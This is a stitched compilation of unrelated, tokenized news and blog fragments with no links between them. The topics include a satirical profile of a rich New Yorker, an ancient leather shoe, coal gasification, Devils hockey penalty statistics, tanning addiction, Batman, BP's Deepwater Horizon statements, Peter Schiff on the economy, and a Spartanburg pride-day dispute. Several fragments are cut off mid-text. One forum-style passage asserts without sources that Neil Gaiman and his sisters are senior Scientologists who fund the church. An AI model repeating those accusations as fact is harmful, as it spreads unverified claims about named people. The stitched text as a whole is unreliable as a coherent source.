" Just as they have for pretty much every generation of our family since the mid-1800s , " she added .
According to Carson , many people he meets are surprised to learn he is the product of a broken home , but his parents — Carolyn Layton , a psychiatrist , and Stephen Carson , a thoracic surgeon — divorced when he was only 18 .
Fortunately , they continued to provide him with unconditional support , as well as nearly unlimited financial resources .

Carson chose to enroll at Columbia University , a decision that took him across Central Park and into a scary new environment he had never experienced before , except on occasional visits to Lincoln Center .
" James really shone at Columbia , " recalled Professor Craig W. Harmon , who served as the young man 's undergraduate adviser .
" It was obvious right from the beginning that he would be successful , largely due to his pedigree , but also because he showed a willingness to do whatever was required to finish a course with at least a passing grade . "

Added Harmon , " Also his grandfather had made several large donations to Columbia and we could n't in our right minds fail him . "
After graduation , Carson took a year off to " see the real world " in Europe before returning to his studies and eventually earning an MBA .
The big move downtown came when he took up residence in a vacant apartment owned by his uncle Charles , a choice that ruffled the feathers of relatives who found the place wholly unsuitable for entertaining .

Despite such obstacles , Carson never let his far - flung location limit his potential :
In the past three years , he 's married , made $ 10 million , and helped engineer the failure of a major Wall Street bank .
The proud family man said Friday that he moved back to the Upper East Side because he wanted to give back to the neighborhood that had given him so much , and to that end he has donated $ 75,000 to the Guggenheim Museum .
Advertisement
" I 'm just a guy who applied himself and took advantage of the myriad financial , social , and familial opportunities available to him , " Carson told reporters from his hometown newspaper , The New York Times .
" Sure , when I was growing up , all four of us had to crowd into one tiny breakfast nook , and maid service was only three times a week , but I 'll never forget the lessons my parents and nanny taught me about hard work and perseverance . "
" Namely , that it does n't matter very much , " he added .

“ I was amazed to find that even the shoe - laces were preserved , ” said Ms. Zardaryan in a media statement .
The researchers suspect cool and dry temperatures inside the cave resulted in exceptional preservation .
Other items were found as well , including large containers , many of which held well - preserved wheat , barley and apricots .
UCLA archeologist Gregory Areshian , who was there at the time the shoe was found , described the items as “ fresh dried , like they were put in a can . ”
It is unclear whether the shoe was made for a man or woman .
While it is a U.S. size 7 women , it could have easily fitted a man ’s foot during that era .
The shoe contained grass , although the archaeologists were uncertain as to whether this was to keep the foot warm or to maintain the shape of the shoe .
Interestingly , the shoe is very similar to the ‘ pampooties ’
worn on the Aran Islands ( in the West of Ireland ) up to the 1950s .
“ In fact , enormous similarities exist between the manufacturing technique and style of this shoe and those found across Europe at later periods , suggesting that this type of shoe was worn for thousands of years across a large and environmentally diverse region , ” said Mr. Pinhasi .
To date , the oldest known footwear in the world are sandals made of plant material found in the Arnold Research Cave in Missouri .
Solid Energy wants to set up a pilot plant for underground coal gasification in the Waikato .
For those who do n't know , underground coal gasification " is a fancy name for starting a coal seam fire .
When these occur naturally or as a result of mining accidents , we recognise them for what they are : ongoing environmental disasters which pollute the air and the local water table .
But stick a pipe down so you can tap the resulting gas , and it becomes the latest in clean energy technology .
The coal industry really is the pits .
Not content with digging great holes in the landscape , they 're now planning to cut costs by just lighting up the coal in situ and leaving it to burn .
Once started , these fires are basically inextinguishable .
But Solid Energy does n’t care about that - all they care about is next quarter 's profits .
This plan is madness .
There are mines on the West Coast which have been burning for decades , and Solid Energy wants to light another one up ?
No thanks .
A little over a week and a half ago , I wrote about the New Jersey Devils power play and offered some suggestions on what they can do to improve it .
While their overall success rate looked pretty good , the numbers underneath told a different tale .
I think it 's fair to say that the Devils ' miserable 4 - for - 32 postseason performance hammered home the point that special teams can be a crucial component of success .
However , I briefly touched on a point that I did n't highlight among areas where the Devils can improve : drawing penalties .
The Devils finished 26th in power play opportunities with 273 and tied for 21st with Atlanta with only 51 power play goals scored .
In retrospect , I should have brought up a suggestion to draw more calls .
I do n't think it 's an issue of Devils need to just get more PPs and they 'll be OK there .
The playoffs proved that to be incorrect .
Still , the Devils were n't strong on the power play in both the regular season and playoffs , and they 'll still need to improve in various aspects in how they 're set up and how the players approach the power play .
Though .
as far as the playoffs go , as Capitals fans and statisticians will tell you , bad things happen to good teams and a cold streak is one of those things .
Nevertheless , getting some more calls certainly would n't hurt .
Fortunately , for you and I , Behind the Net actually compiles these numbers at the even strength level .
The even strength situation is the most important since a majority of each game is played at 5 - on - 5 hockey and , of course , drawing a call there would lead to a power play .
Plus , determining who took the most penalties at this level can help identify which Devil needs to work on his discipline and further help out the penalty kill .
Let 's take a closer look at the New Jersey Devils ' penalties drawn and taken from the 2009 - 10 season and see if there 's anyone on the market who could help out in this regard .
Introductory Notes
As a quick note , when you see a penalty " taken , " I believe this is referring to a player who took a penalty drawn by someone else .
It 's not the same as the player taking any kind of call - as I understand it , this counts penalties they were forced to take by an opposing player .
A penalty " drawn " happens when the opposing player is forced to take a penalty by said player .
If I have this wrong , I will make the appropriate corrections to my observations .
Again , all numbers are from Behind the Net 's Penalties and Drawn Taken module - here 's the link for the whole NHL and click here for the New Jersey Devils ' numbers .
They are all from the 2009 - 10 season ; I 'm not including the playoffs due to it 's smaller population size ( where randomness really can have a strong effect ) .
Besides , I think decisions for 2010 - 11 should be made with the season 's performance in mind , knowing how well a player performed over a far larger population size of games .
The Top Penalty Drawers on the 2009 - 10 Devils
Here are the top 10 New Jersey Devils in terms of number of penalties drawn in 5 - on - 5 hockey .
Of all 217 penalties drawn , these contributed 150 of them - 69.1 % of all drawn penalties on the team .
By the way , Ilya Kovalchuk is grayed out because Behind the Net does n't split up numbers for players who were traded .
If you must have the tenth guy be a full - time Devil , it 's Jamie Langenbrunner who took 13 and drew 9 calls .
Zach Parise clearly leads the way on the team and it should surprise no one who 's seen him play .
His constant motion on the ice along his tendency to take the puck down low and to the net often forces opposition players to impede him via infraction .
Incidentally , in terms of number of penalties drawn , Parise finished third in the league behind The Actor , Daniel Carcillo ( 42 ) and Dustin Brown ( 46 ) .
Parise 's not just good at drawing calls , he 's exceptional .
I do n't know what 's more surprising , that Vladimir Zharkov drew 15 calls while only taking 1 , that two defensemen made this list , or that Mike Mottau is one of those defensemen .
Honestly , I do n't think going by number of drawn penalties alone makes someone the best at drawing calls .
For example , Mike Mottau and David Clarkson both drew 11 penalties but got goaded into taking more penalties .
Looking at the league as a whole , Alexander Burrows did well to draw 32 calls but undercut himself by taking 37 .
How can one say he benefits the Canucks in this aspect of the game ; as he 's ninth in drawing calls , but first in taking calls ?
On the whole , I do n't think he does from a penalty standpoint .
With that in mind , I took the numbers at Behind the Net and calculated a drawn / taken ratio for the Devils .
The best drawers of penalties should be the ones who do n't necessarily take calls , in my opinion .
Here are the top ten Devils from this past season by drawn / taken ratio :
By ratio , your best penalty drawer really is Vladimir Zharkov .
And why not ?
Drawing 15 calls and only taking one largely on a fourth line role is impressive .
It 's even more impressive that his ratio of 15 is the highest among all 717 NHL players in 2009 - 10 who have taken at least one penalty ( # 2 is Milan Michalek with 13 drawn and 1 taken )
Yes , Zharkov leads the league in an advanced stat .
I 'm sure his agent has already printed this out upon reading this .
His speed , work ethic , and mindset on the ice , I think , have contributed to such a high ratio .
He had a knack for catching his opposition off base be it on the rush , in the corners , or along the boards - regardless of their relative quality of competition .
Again , I must emphasize that he needs to work on his shot because if he improves there , then he 's got a great shot at enjoying a long NHL career .
In fact , there are a number of fourth liners on this list : Dean McAmmond , Jay Pandolfo , and Pierre - Luc Letourneau - Leblond all move up here and show some worth in terms of drawing calls over taking them .
You 'd like to see a little more , but for players who have n't seen a whole lot of ice time , it definitely helps on the back end when the opposition may be resting their top defenders .
And Parise still stands out .
In fact , looking at the whole league , Parise is 11th in the drawn / taken ratio among players who have drawn at least 20 calls .
Incidentally , who 's first in the league ?
Pavel Datsyuk with a 9.67 ratio ( 29 drawn , 3 taken ) - further proof that Datsyuk is an amazing player .
If Andy Greene needs another feather to stick into his cap for his 2009 - 10 season , then he should check out this chart .
Drawing 10 calls as a defensemen while only taking four is pretty impressive by itself .
It 's exceptional among his peers .
Only Paul Martin ( 4 drawn , 1 taken , 21 games ) , Tyson Strachan ( 3 drawn , 1 taken , 8 games ) , and Andrej Sekera ( 8 drawn , 3 taken , 48 games ) had higher drawn / taken ratios than Greene among defensemen and they did n't play nearly as much as Greene .
Yes , Kovalchuk is still on this list , Cory Murphy is pushed up quite high and Paul Martin 's shortened season comes in second .
If you ignore those three , then add Dainius Zubrus ( see the first chart for his numbers ) , Colin White ( took 7 , drew 8 , ratio of 1.143 ) , Travis Zajac ( see first chart - he's the only regular who 's even ) as the next Devils on the list .
Knowing this , I would suggest that Devils on the top 6 who are n't high up on this chart Zajac , Patrik Elias , Jamie Langenbrunner , and Dainius Zubrus take a look not just at Parise but also Zharkov to see what they do to draw calls .
Is it just by being quick ?
Is it just by imposing themselves in positions that draw opposing players to do something dumb ?
I 'm not saying that they all have to be penalty drawing machines , but an improvement by even a few penalties .
Bottom six players like David Clarkson , Leblond , Rod Pelley , and any incoming rookies would also benefit from examining this phenomenon further .
The Top Penalty Takers on the 2009 - 10 Devils
The above established who was the best at drawing penalties on the 2009 - 10 Devils .
Who are the worst ?
Who 's been getting the Devils into trouble by being forced to make an infraction ?
Here are the " leaders " in the number of penalties taken :
Oh , Bryce Salvador .
20 penalties puts you in a big tie for 17th in the NHL among defensemen in terms of taking calls .
Leading the team here is definitely not desirable .
Given that Salvador is n't fast in his own zone combined with his physical style , perhaps I should n't be surprised he leads this list .
I am a bit disappointed .
You may say the same goes for Mottau , but he is n't physical or slow as Salvador .
He just made a few too many dumb errors and got caught behind a few too many times , it seems .
Both need to improve their discipline .
I 'm also quite disappointed in some of the other names on this list .
5 of the top 6 forwards are on this list !
Given that Parise draws so many more calls , I 'm not so unhappy about him .
Yet , I 'd like to know why in the world Jamie Langenbrunner , Dainius Zubrus , and Patrik Elias are so high up here ?
OK , Zubrus is usually seen along the boards and he could be caught with an infraction in the fracas .
Any explanations for Langenbrunner and Elias ?
I do n't have any that come to mind .
David Clarkson and Rob Niedermayer should also spend their summers understanding the rulebook .
If Clarkson is supposed to be a pest , then should n't he be drawing more calls than taking them ?
Sure , he 's gritty and physical , but definitely to a fault from this standpoint .
Niedermayer 's ratio is miserable .
As a checking center , I can see why some penalties have to be taken at times , but this is just poor .
I hope his replacement will be more disciplined or at least better at not getting caught .
By the way , Salmela is grayed out because he 's played in both New Jersey and Atlanta .
If you need to know who 11th place is , it 's Mark Fraser with a head - shaking 8 taken calls with only 1 drawn .
You 'll see him in this chart , the worst drawn / taken ratio by Devils who have at least drew one call in 2009 - 10 .
Again , Skoula and Salmela are grayed out so if you must know who the next regular Devils are on this list , it 's Davis Clarkson ( see above chart ) and Rod Pelley ( 5 drawn , 6 taken ) .
Mark Fraser being first on this list clearly shows that one of the areas he can improve upon for his second season of NHL hockey is discipline .
I 'm not expecting a defensive defenseman like him to draw too many calls , but he can stand to avoid taking some .
His limited ice time makes that ratio even worse , in my opinion .
We have an Ilkka Pikkarainen and a Matthew Corrente sighting , but the most of the main offenders on the list are from the other chart .
This tells me that Bryce Salvador , David Clarkson , Jamie Langenbrunner , Patrik Elias , David Clarkson , and Mark Fraser all need to work on their game .
Not just in terms of discipline and controlling emotions , but also in their positioning and decision making so they are n't in the position where they have to take a penalty
As for Mike Mottau , Rob Niedermayer , and Martin Skoula , well , if they 're not re-signed , the Devils will improve in this regard .
Provided that the organization should be sure that their replacements are n't prone to taking calls .
By the way , there were five Devils with a drawn / taken ratio of zero ( meaning : they drew no calls at even strength ) and one with an undefined ratio ( one taken , none drawn )
Most were call - ups but one sticks out like a sore thumb .
At last , some means of stating that Andrew Peters actually hurt the team .
As an aside , Patrick Davis ' lack of penalties taken puts him in exclusive company of 39 NHL players who have not been goaded into taking a call at even strength .
The vast majority are call - ups and only played part of a season , so the king of this group was the lone regular : Carolina 's Brandon Sutter .
He drew 15 calls but did not get forced to take one in 5 - on - 5 hockey .
Impressive .
Available Penalty Drawers ?
OK , so the Devils players can help themselves by studying how Parise and Zharkov drew their calls and other players can improve the team by taking fewer calls themselves .
Is there anyone on the upcoming market who can significantly help the Devils draw more penalties in 5 - on - 5 situations ?
Based on last season 's numbers at Behind the Net , not really .
Among all 62 players who have drawn 20 penalties , only 5 are unrestricted free agents .
Jon Sim ( 26 drawn , 13 taken ) ; Ruslan Fedotenko ( 24 drawn , 16 taken ) ; Paul Kariya ( 20 drawn , 14 taken ) ; Maxim Afinogenov ( 21 drawn , 15 taken ) ; and Scott Nichol ( 21 drawn , 16 taken ) .
Only one of those five is a center , and it's the bottom six center 35 - year old Nichol .
Not exactly an enticing player , though he could be had for cheap .
Even if the Devils are n't able to sign Kovalchuk , the Devils are still pretty set at wing - they really do n't need another winger at this juncture .
Therefore , I do n't think the Devils should jump at the chance at going after any of those five .
Not even to get more penalties drawn if only because we know they 're going to take a considerable amount over time .
Besides , I do n't think the Devils should make their personnel decisions for the upcoming offseason based on penalties drawn / taken alone .
It 's not as if a high ratio will lead a team to success .
Toronto had two of the best on their team in Niklas Hagman ( 29 drawn , 5 taken ) and Nikolai Kulemin ( 23 drawn , 3 taken ) and it did n't exactly make the difference for the Maple Leafs .
But I will say that it is a positive .
Enough to be considered as it can show whether the player in question could be a liability or not when it comes to taking calls .
Manny Malhotra , for example , also has a drawn / taken ratio below 1 with 7 drawn and 10 taken .
Not a great ratio , yet , it 's an considerable improvement over Rob Niedermayer from a penalty standpoint because it's an improved ratio and because it is fewer calls .
The key word there is " improved . "
The player in question does n't necessarily need to be among league leaders in penalties drawn or taken ( leader as in fewer calls ) from 2009 - 10 , but ideally would be better than the players they would replace .
It would think it would be more reasonable to take into account when the Devils are evaluating potential free agents .
Conclusion
To that end , I cannot emphasize enough that looking at players in this way is only to see how they are from a penalty standpoint .
If the Devils can get a few players who can have more calls drawn , then that would at least give the Devils power play more opportunities .
If the Devils can reduce the numbers of calls taken - even just by subtraction of a few 09 - 10 players - then the penalty kill will benefit from reduced shorthanded situations .
Again , improvement should be seen as the goal .
I 'd like to see players added who would improve the Devils in either case .
In terms of free agency , The Devils should avoid exacerbating either situation in a negative direction by signing players who take more penalties than the players they replaced and / or draw fewer penalties than the players they replaced .
Yes , special teams does need improvement in their strategy and execution , where they will need new tactics and personnel .
However , creating more power play opportunities and / or reducing penalty killing situations would also benefit the team and the organization should look to do that in conjunction with improving special teams performance .
Have Your Say
Thanks for reading .
Hopefully , you found all of this interesting as much as I did while researching it .
Thanks to Behind the Net for compiling and storing penalties drawn and taken numbers .
Now it 's time for your opinion .
What do you think of how the Devils draw penalties ?
Surprised to see Vladimir Zharkov stick out so much along with Zach Parise ?
How about how the Devils took penalties ?
Were you more disappointed seeing Salvador and Mottau so high or that Clarkson , Langenbrunner , Elias , and Niedermayer made that penalties taken list ?
Glad to see some statistical basis proving that Andrew Peters has n't helped the Devils ?
How about the free agent market ?
Would seeing their penalties taken / drawn count and ratio change your opinion on some pending free agents ?
Lastly , do you think the Devils can really improve in this area or is it more of a uncontrollable / unrepeatable than anything else ?
Please leave your thoughts in the comments .

And so the incidence of skin cancers , including potentially fatal melanoma , continues to rise .
This year , 3.5 million new cases of superficial but often disfiguring skin cancers , and an estimated 68,720 melanomas , will be diagnosed among Americans .

Many people think a tan protects them by helping block the damaging effects of UV radiation .
In fact , a tan represents skin damage .
Even brief exposure to ultraviolet light can cause mutations in the DNA of skin cells , including the melanocytes , the host cells for melanoma .
Accumulate enough of those mutations and a cancer can result .
“ As we age , the number of mutations increase and our immunity wanes , ” Dr. Wagner explained  a double whammy that greatly increases the likelihood of skin cancer .
Even those who escape cancer will eventually experience the aging effects of repeated tanning : loose , wrinkled , leathery skin that can make people look decades older than they are .
My paternal grandmother , who lived a block from the beach in Brooklyn and swam daily in the years before sunscreens , had what we called “ elephant skin ” by her 50s .
But my 90 - year - old Aunt Gert , who lives nearby and winters in Florida but never went to the beach or sat in the sun , has the skin of a 60 - year - old .
Summarizing the mounting evidence for the addictive potential of UV radiation , Dr. Hornung said in an interview that frequent tanners showed signs of both physiological and psychological dependence .
As with cigarette smoking and heavy drinking , which are “ often practiced despite knowledge of their dangers , ” she said , attempts to curtail UV abuse through education about its dangers seem to fall on deaf ears .
Clearly , something else is driving the behavior , and for some people that something seems to be addiction .
In Dr. Wagner ’s study , conducted with Dr. Molly M. Warthan and Tatsuo Uchida , two tests of substance abuse were administered to 145 people basking in the sun on Galveston Island Beach .
One is a modified version of the test often used to root out alcohol addiction .
It ’s called CAGE , an acronym for four questions :
Have you ever felt you needed to cut down on your tanning ?
Have people annoyed you by criticizing your tanning ?
Have you ever felt guilty about tanning ?
Have you ever felt you needed to tan first thing in the morning  as an eye opener ?
The authors , who published their report in 2005 in The Archives of Dermatology , found that 26 percent of the beachgoers met the CAGE criteria for addiction .
And in a second test , a modified version of the psychiatric profession ’s official diagnostic criteria for a substance abuse disorder , 53 percent of the respondents scored positively .
Batman is an ongoing comic book series featuring the DC Comics hero of the same name .
The character first appeared in Detective Comics # 27 , published in May 1939 ; Batman proved to be so popular that a self - titled ongoing comic book series began publication in the spring of 1940 .
Batman [ edit ]
Batman's ( 1939 –current ) secret identity is Bruce Wayne , a wealthy industrialist , playboy , and philanthropist .
Witnessing the murder of his parents as a child , Wayne trains himself both physically and intellectually and dons a bat - themed costume in order to fight crime .
Batman operates in the fictional American Gotham City , assisted by various supporting characters including his sidekick Robin and his butler Alfred Pennyworth , and fights an assortment of villains influenced by the characters ' roots in film and pulp magazines .
Unlike most superheroes , he does not possess any superpowers ; he makes use of intellect , detective skills , science and technology , wealth , physical prowess , and intimidation in his war on crime .

April 29 BP COO
Suttles was quick to point out that another company was operating the rig at the time of the explosion , not London - based BP .
April 30 " This was not our accident , " CEO Hayward told Reuters .
" I can say that we had equipment required by the regulations , " he said .
" We do n't know why , when the accident occurred , and I should probably clarify , the lease we are drilling on is owed by BP and a few other companies . "
ABC News May 3
" This was not our drilling rig , it was not our equipment , it was not our people , our systems or our processes , " CEO Hayward told the FT / BBC .
May 16
In an interview with 60 Minutes , Deepwater Horizon survivor Mike Williams claimed that BP managers had overruled Transocean in the well - sealing process :
In the hours before the disaster , Deepwater Horizon 's work was nearly done .
All that was left was to seal the well closed .
The oil would be pumped out by another rig later .
Williams says , that during a safety meeting , the manager for the rig owner , Transocean , was explaining how they were going to close the well when the manager from BP interrupted .
" I had the BP company man sitting directly beside me .
And he literally perked up and said ' Well my process is different .
And I think we 're gonna do it this way . '
And they kind of lined out how he thought it should go that day .
So there was short of a chest - bumping kind of deal .
The communication seemed to break down as to who was ultimately in charge , " Williams said .
( 60 Minutes ) May 26
The rig 's chief mechanic , Transocean 's Douglas Brown , testified : " I recall a skirmish taking place between the company man ... and the tool pusher and driller concerning the events of the day .
The driller was outlining what was going to be taking place .
Whereupon the company man stood up and said ' No .
We have some changes to that . '"

Neil Gaiman is a member in good standing in the cult and his siters Clair Edwards ( Head of Scientology recruiting worldwide ) and Lizzie Calcione ( Head of East Grinstead 's Wealdan House ) are prominent Scientologists .
Neil Gaiman has been named a Patron of Scientology and a Founding Patron of Scientology and despite paying the cult $ 35,000.00 in November 2009 , he continues to present himself as " Jewish .
" Neil Gaiman 's kids at the Greenfield 's school : Neil Gaiman at Wealden House East GrinsteadAmanda Palmer is surrounded by Scientologists and is doing a project with Frances Bean Cobain , whose mother , Courtney Love thanked Narconon on an album for curing her of drugs .
Gaiman and Palmer are working as a team , with the Scientology seal of approval .
They got paired up to make money , that ’s why their relationship was “ launched ” with pictures , a soundtrack , a self published vanity book of bloody snuff porn pictures of Palmer .
There is a good thread on this over on " Why We Protest ...
" Re : Neil Gaiman stands with Scientology !
Quote : The Gaimans are people who were recruited into the cult but were never living off rice and beans .
At the time they started out , having businesses relating to the cult ( as long as you paid in ) were allowed .
They 've wasted their lives on the cult and are out of pocket because of it but always made sure they were relatively comfortable .
So Neil Gaimen and second generation scientologists like him have no real incentive to speak out against the abuses Anonymous is right here .
I hate to bring this crap up again , but Neil Gaiman has one of the most obvious and accessible records as a Scientologist I 've ever seen .
Scientologists do not associate with non-Scientologists .
Neil Gaiman is in the grip of Scientology , that is why there are recent photos of him at Wealden House .
The money trail is undeniable , he ’s been named a Patron with Honors and a Founding Patron and has given $ 100,000.00 to the CULT .
Neil is a second generation Scientologist stuck deep in the cult and every person he is associated with in public is either approved by Scientology or is a connection who brings in work and money .
The 2009 listing for Neil and Mary Gaiman is only the latest evidence that Neil is in good standing .
Is he going to leave ?
I have no idea , but the fact is that Neil Gaiman funds the cult that we are all spending precious resources to fight .
In 1983 Neil Gaiman is supposedly declared " suppressive " but in 1988 , FIVE YEARS AFTER THE DECLARE , Neil ’s name appears in graduate lists in The Auditor Worldwide ( published by AOSH UK ) as Auditor # 202 ( copyright 1986 ) .
Neil is listed as completing three courses : the Hubbard Senior Sec Checker Course # 222 ( 1988 ) , the 21 Dept Org Board Course # 227 ( 1988 ) and the Hubbard Basic Art Course .
Is he going up the bridge now ?
I do n't know .
But he 's clearly FUNDING the cult , which to me is worse .

Recently by Peter Schiff : Is Sovereign Debt Crisis Contained to Subprime ?
In recent months , GDP numbers have rebounded — primarily as a result of record low interest rates reliquifying the credit market and government stimulus jolting consumer spending .
Although the " positive growth " has delighted Obama ’s economic brain trust , it has done little to boost the fortunes of Main Street .
As I have said many times , GDP largely measures spending , and spending is not growth .
Last Friday we received the latest indication that the real economy is not recovering in the slightest .
The Labor Department reported that non-farm payrolls increased by 431,000 jobs in May .
In a press statement , the President himself crowed at the news , noting that the official employment rate fell to 9.7 % from 9.9 % .
However , just inches below the headline , red flags were everywhere .
Only 41,000 of those jobs were generated in the private sector — far below the median forecast of 180,000 .
Even more troubling was the fact that the Census Bureau alone accounted for 411,000 new jobs , which were almost exclusively temporary positions .
Rather than a recovery , the jobs data seems to indicate that we are still mired in the first economic depression since the 1930s .
Back in 1931 , two full years after the Crash of 1929 , there were still very few people who thought that the recession then underway would one day be called the Great Depression .
( See my commentary from March 1st " Do n’t Bet on a Recovery . " )

Increased spending , financed by unprecedented borrowing , will prove to be just as temporary as a US census job ( unless , in the name of stimulus , Obama decides to make " people counting " a permanent function of the US government ) .
When the bills come due , the next leg down will be even more severe than the last .
The swelling ranks of the government payroll , and the shrinking number of private taxpayers footing the bill , will guarantee larger deficits and a weaker economy for years to come .
In addition , the artificial spending has prevented a much - needed restructuring from taking place , leaving our economy far less efficient than before the crisis began .
In other words , we have dug ourselves into a much deeper hole while failing utterly to build any means to climb out .
One reason that we have thus far been spared the full wrath of Washington ’s poor decisions is that we are still benefiting from problems abroad , particularly in the eurozone .
As sovereign debt issues have temporarily caused a flight to the dollar , our economy has benefited from lower interest rates and restrained consumer prices .

However , EU member - states have shown some willingness to confront their problems by cutting government spending — correctly ignoring US government suggestions that they do the opposite .
Just today , newly elected UK Prime Minister David Cameron prepared his constituents for austerity .
Citing a budget deficit that is currently running at 11 percent of GDP , Cameron indicated that government spending would have to fall in order to maintain solvency and a high standard of living .
Cameron went on to say , " Greece stands as a warning of what happens to countries that lose their credibility , or whose governments pretend that difficult decisions can somehow be avoided . "
This type of realistic sentiment is completely absent in our current leadership in Washington , even though the US deficit is 9.9 percent of GDP and mounting .
Meanwhile , the tough decisions being made by European governments will start to rebuild investor confidence in the euro .
The Little Book of Bul ... Peter D. Schiff Best Price : $ 0.05 Buy New $ 1.99 ( as of 05:25 EST - Details )
Once the euro finally stabilizes against the dollar , I expect commodity prices to resume their rise , especially oil .
Normally , the uncertainty created by the disastrous oil spill in the gulf , and the resulting moratorium on deep - water drilling , would have sent crude oil prices skyrocketing .
However , fears of a global slowdown , euro weakness , and general risk aversion have held prices in check .
As Asia continues its growth and Europe regains its footing , I expect a delayed surge in oil prices , which will put yet another obstacle on the road to US recovery .
Our last remaining leg of support has been the activity of Asian central banks , who have continued in their herculean efforts to prop up the dollar and bail out Americans with low interest rates and cheap imports .
However , when sovereign credit risk eventually rears its head in America , look for Asian policymakers to finally wise up .
Once that prop is removed , there will be no questions about the gravity of our situation — and little dispute that it amounts to a depression .
The real danger will be if we follow our own foolish advice that Europe appears to have rejected .
Treasury Secretary Timothy Geithner has bluntly suggested that European governments should print and spend money in order to keep their economies out of recession .
In reality , cutting government spending is a far better stimulus .
Maintaining lavish budgets through the use of the printing press will only result in disaster .
Not only will such action fail to avert a double - dip recession , but it will practically ensure an inflationary depression .
As I have said before , we ca n’t simultaneously grow the economy and grow government .
The latest jobs report shows that we are just growing government .
If that trend does n’t soon reverse , investors will start betting on the collapse of the dollarzone .
The Best of Peter Schiff
In Spartanburg , South Carolina , Mayor Junie
White is a strong ally of the LGBT community .
In late May , he signed a proclamation marking today , June 19th , Lesbian , Gay , Bisexual and Transgender Pride Day .
[ The mayor signed ] a resolution that states , “ The city of Spartanburg supports efforts to ensure that everyone has the right to live in conditions of dignity , respect and peace ” and “ Pride Week celebrations contribute to reducing discrimination , isolation and barriers faced by the Lesbian , Gay , Bisexual , Transgender and Two Spirited community . ” …
“ I ’m very excited , and I think it ’s a sign that Spartanburg is willing to recognize everyone who lives in the city and outside the city and it recognizes civil rights and how we should respect and accept an individual ’s choices , ” said Councilwoman Cate Ryba , who attended last year ’s march .
A week later , Mayor White wrote this wonderful op - ed piece in the Herald - Journal .
I believe that in time , just like with the right of American women to vote , and the right of people of any race to marry people of another race , most people will come to agree that all people should be afforded the same right to love and marry whom they please , work where they please , and enjoy these rights without worry .
All the LGBT folks want to do is have a march , to be recognized in their struggle to have the same rights as all other Americans .
As mayor of the city of Spartanburg , I am proud that their organization came forward to ask for the proclamation , because they believe in our city , that Spartanburg is a place where all persons can speak up without fear .
That ’s all they want — a march to be recognized .
They want to show people they exist .
And that there ’s nothing wrong with who they are .
But wait .
Civil rights ?
For LGBT people ?!
We ca n’t have that , said a whole bunch of local Christians .
Yesterday , there was a protest against the Pride Day in front of Spartanburg City Hall .
Joining them was City Councilwoman Linda Dogan .
You have to hear this speech she gives .
It ’s vile … she is * really * angry that the LGBT community is getting any recognition .
I listened to that disgusting speech .
And then I started it over , clenched my teeth , and transcribed the damn thing just to get it on record .
Grace and peace be with you , from God , our father , and our Lord , Jesus Christ .
I ’m not coming to you as a city councilperson .
I ’m coming to you as a child of God .
You know , what people do n’t understand , we are not speaking hate .
We are speaking love .
But as a child of God , God says , “ If you deny me , I will deny you . ”
And for this proclamation to go on without the knowledge of full council is an insult .
In my 16 years as a council member , I have never been so embarrassed .
You know , for our families , this is an insult .
And it ’s early to say …
I love [ Mayor ] Junie White , but he will go down as the worst mayor of the city of Spartanburg .
The worst .
[ Crowd yells , “ Right on ! ” ]
And it ’s not hate .
But let me go a little deeper .
As a black woman , born in Spartanburg , South Carolina , born during segregation , not one time we rode the back of the bus they ask you if you were gay or not .
They looked at the color of your skin and they said , “ You got to go , then . ” …
So when you talk about civil rights , you talk about stuff that ’s real , that people have gone through .
I went to a restaurant when I was 17 .
They said , “ I ’m sorry but you ca n’t come in the front door . ”
The thing about being black , I ca n’t take this off .
But being gay or lesbian or whatever you want to call it , you can choose to be that way .
You can choose to be that way .
I ca n’t choose to be black .
I ’m proud of it .
I am proud of it because God made us all equal .
The insult is deeper .
It ’s not only Christians that it ’s offensive , but as a black person .
And I want to know where the black pastors are .
[ Crowd yells , “ Where you at ? ” ]
You know , you can get mad at me if you want to .
I ’m used to people being mad at me .
But you should be here !
You should be here .
Not to spew hate , but to give love .
And I ’m sick of people saying I do n’t have compassion .
I ’m one of the more compassionate people that you will ever find .
I ’ve never said to a gay person , “ I hate you ’ cause of what you do . ”
I ’ve never shown ’em any difference than anybody else .
But trust me , I felt the difference — as a black woman . …
And I am not preaching , because I am not a preacher .
[ Crowd yells , “ Yes , you are ! ” ]
I ’m not a preacher .
But I want you to know that I am not up here saying , “ Hate . ” I ’m saying , “ Love you . ”
But we do n’t need to endorse YOUR lifestyle because you not going to endorse MY lifestyle .
And to cause this , this division of our city , of our county , is just wrong .
If you ’re true to the cause … you do n’t have to cause that disruption .
And I ask all of you here not to go to that parade , because you ’re giving them what they want .
They want you to go out there and howl at them and say , “ You ’re wrong . ”
Stay at home and pray for them !
I just thank you all for taking this stand and sharing love .
Make no mistake about it .
This is love that we ’re sharing .
Nothing else .
And at 56 years old , when God had better send me somebody , it ’s gonna be a man .
A man .
You know , God bless you all .
Thank you .
Where to begin… ?
Ugh , I do n’t know where to start .
Feel free to pick it apart in the comments .
Just remember : they ’re not proclaiming hate .
They ’re full of love .
Pure love .
All kinds of love .
Loving love .
Not hate .
Love .
Could n’t you hear it in her speech …?
*** Update ***:
As one commenter notes , here ’s the original proclamation :
“ WHEREAS , the city of Spartanburg supports efforts to ensure that everyone has the right to live in conditions of dignity , respect and peace ; and WHEREAS , the city of Spartanburg continues to advocate for the elimination of all forms of discrimination and is committed to equal treatment of all people ; and WHERE , Pride Week celebrations contribute to reducing discrimination , isolation , and barriers faced by the Lesbian , Gay , Bisexual , Transgender and Two Spirited community .
NOW , THEREFORE , I , Junie L. White , by virtue of the authority vested in me as Mayor of the city of Spartanburg , and on behalf of my fellow City Council members , do hereby proclaim June 19 , 2010 , as : LGBT PRIDE DAY . ”
After Dogan complained , the mayor amended the proclamation :
… he removed the words , “ On behalf of my fellow City Council members , ” from the proclamation to , “ Keep the peace . ”
This happened weeks before she gave the speech in the video .

Today marks the International Day Against Homophobia , a time to fight and to raise awareness about negative and disparaging attitudes toward queer folk .
Organizers encourage the queer community to reach out to not only people perpetuating homophobia but each other , lending support and acceptance to the community .
Over 60 cities have chosen to celebrate IDAHO this year through the Great Global Kiss -in :
“ The cops are putting their helmets on ! ” one anarchist shouts .
“ Stay tight , stay tight ! ”
A masked man raises his hands in the air and cracks his knuckles .
Others tighten their vinegar - soaked bandanas and strap on swimming goggles .
Everyone waits for something to happen .
There was always potential for chaos .
But before our week as protesters , we did n’t know how it could come to this .
Monday , June 21 – Taking back the streets
Bike cops are stationed on every corner of Allan Gardens , and swarms of journalists eagerly await the G20 ’s first demonstration .
But right now there are only a handful of protesters sitting quietly in small groups on the grass .
“ Is Marsha here yet with the megaphone ? ” one organizer asks the group .
“ No ? Really ?
